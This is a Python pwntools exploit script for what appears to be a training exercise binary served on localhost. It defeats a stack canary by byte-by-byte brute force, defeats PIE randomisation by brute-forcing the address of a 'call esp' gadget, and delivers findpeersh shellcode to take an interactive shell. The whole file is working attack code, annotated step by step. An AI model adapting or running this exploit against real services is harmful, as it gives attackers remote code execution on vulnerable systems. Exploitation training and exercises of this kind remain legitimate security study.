#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
from sys import exit

context(arch = "i386", os = "linux")
#We will connect and reconnect a lot and we do not want to be told every time we do it.
getLogger('pwnlib.tubes').setLevel('WARNING')

SHELLCODE = asm(shellcraft.findpeersh())
CANARY_OFFSET = 320
RET_OFFSET = 12

#ECX and ESP pointed into data that we control, found with "ROPgadget --binary $E | grep -E ': ((jmp)|(call)) ((ecx)|(esp))'"
CALL_ESP_OFFSET = 0x00000e0e

def connect():
    r = remote('localhost', 10007)
    r.recvline()
    return r

def brute_canary():
    '''This function will find the canary by brute force.
       It will overwrite the canary one byte at a time.
       If the server responds with 'Goodbye...' we have found a good byte.
       If not, we try another.
       When we have four bytes, the canary is complete.
    '''
    canary = b'' #This will contain the good canary bytes
    pcanary = log.progress('Canary') #We want status updates
    #Run as long as we do not have all four canary bytes
    while len(canary) < 4:
        #Brute force one byte (values 0-255).
        for c in bytes([i for i in range(256)]):
            #Next four lines are simply updating the status
            temp_full_canary = canary + bytes([c])
            while len(temp_full_canary) < 4:
                temp_full_canary += b'\0'
            pcanary.status('0x%08x' % u32(temp_full_canary))

            #Send known good canary byte and one byte that we want to test
            r = connect()
            r.send(flat(0xffffffff, b'A' * CANARY_OFFSET, canary, c))
            #If server responds with 'Goodbye...' we have found a good canary byte
            if b'Goodbye' in r.recvall():
                canary += c
                break
    #End by updating the status with a success message
    pcanary.success('0x%x', u32(canary))
    return canary

def brute_call_esp(canary):
    '''This function will find the address where 'call esp' is located by brute force.
       It can only be located in one of 1024 different addresses so we simply try them all
       until our exploit succeeds. It indicates success by sending us back the output of a command.
    '''
    #This is the address the binary was loaded in one instance. Was found like this:
    #cat /proc/$(pidof integer_conversion_canary_pie)/maps | grep integer_conversion_canary_pie|head -n 1
    ONE_LOAD_ADDRESS = 0x565a6000
    ONE_CALL_ESP_ADDRESS = ONE_LOAD_ADDRESS + CALL_ESP_OFFSET
    PIE_MASK      = 0x003ff000 #Find this in the presentation material
    PIE_INCREMENT = 0x00001000 #Will increment the randomizable bits
    CALL_ESP_LOW = ONE_CALL_ESP_ADDRESS & ~PIE_MASK #Lowest address is one of the addresses with all randomizable bites set to zero
    CALL_ESP_HIGH = ONE_CALL_ESP_ADDRESS | PIE_MASK #Highest address is one of the load addresses with all randomizable bites set to one
    call_esp = CALL_ESP_LOW

    #We want findpeersh in this test
    shellcode = asm(shellcraft.findpeersh())

    #We want status updates
    ppie = log.progress('CALL ESP')
    while call_esp <= CALL_ESP_HIGH:
        try:
            ppie.status('0x%08x' % call_esp)
            r = connect()
            r.send(flat(0xffffffff,
                        b'A' * CANARY_OFFSET,
                        canary,
                        b'A' * RET_OFFSET,
                        call_esp,
                        shellcode))
            #Sleep to make sure the data is sent. If it succeeded a shell is spawned and the next data we sent
            #is interpreted by the shell. Had we not slept the next data would be sent to the integer_... process.
            sleep(0.01)
            #If we have found the 'call esp' instruction we now have a shell
            #and in that case the next shell commands will print stuff and disconnect from us
            r.sendline(b'echo blar && exit')
            #If we had a shell the above would be executed and we will have 'blar' in the reply
            if b'blar' in r.recvall(timeout = 1):
                #Found it!
                ppie.success('0x%08x' % call_esp)
                r.close()
                return call_esp
        except:
            pass
        finally:
            #Try next possible address
            call_esp += PIE_INCREMENT



#First find the canary by brute force
CANARY = brute_canary()
#Then find the call to ESP
CALL_ESP = brute_call_esp(CANARY)

#Now we're ready to take over the process
r = connect()
r.send(flat(0xffffffff, 
            b'A' * CANARY_OFFSET,
            CANARY,
            b'A' * RET_OFFSET,
            CALL_ESP,
            SHELLCODE))
r.interactive()
